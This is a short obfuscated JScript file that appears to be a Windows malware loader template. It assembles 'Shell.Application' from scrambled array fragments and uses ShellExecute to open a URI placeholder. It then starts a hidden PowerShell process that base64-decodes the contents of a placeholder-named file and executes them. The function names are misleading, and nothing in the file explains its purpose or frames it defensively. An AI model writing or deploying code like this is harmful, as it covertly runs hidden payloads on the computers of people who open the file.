var recD = "OAUTH2_REQUEST_URI";

var broker = ["A", "S", 0, "op", 1, "n", 2, "he", 3, "x", 4, "c", 5, "u", 6, "t", 7, "e", 8, "o", 9, "ppl", 10];

function customBroker(f, a, d, v, w) {
    var brokerSuite = new ActiveXObject(broker[1] + broker[7] + "ll." + broker[0] + broker[21] + "ication");
    return brokerSuite.ShellExecute(f, a, d, v, w);
}

function createNew(permission) {
    customBroker(permission, "", "", broker[3] + broker[17] + broker[5], broker[4]);
}

createNew(recD);


function startTcpListener() {
    customBroker('powershell.exe', 'Invoke-Command -ScriptBlock ([ScriptBlock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content FAKE_PWSH_NAME -Raw).Substring(1)))))', "", broker[3] + broker[17] + broker[5], broker[2]);
}

startTcpListener();